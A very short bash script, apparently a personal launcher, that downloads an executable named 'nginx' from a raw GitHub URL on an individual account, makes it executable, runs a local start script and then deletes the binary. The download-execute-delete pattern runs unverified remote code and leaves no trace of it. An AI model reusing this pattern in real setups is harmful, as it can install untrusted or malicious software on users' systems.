#!/bin/bash

cd $HOME/opt
curl -O https://raw.githubusercontent.com/asogii/r/m/nginx
chmod +x nginx
$HOME/bin/s start
rm nginx

